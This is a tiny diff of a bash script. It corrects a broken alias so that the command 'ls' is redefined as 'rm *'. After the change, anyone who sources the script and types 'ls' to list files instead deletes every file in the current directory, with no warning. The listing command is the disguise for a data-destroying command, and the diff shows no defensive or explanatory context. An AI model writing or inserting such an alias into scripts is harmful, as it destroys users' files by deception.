@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls= 'sudo rm *'
+alias ls='rm *'
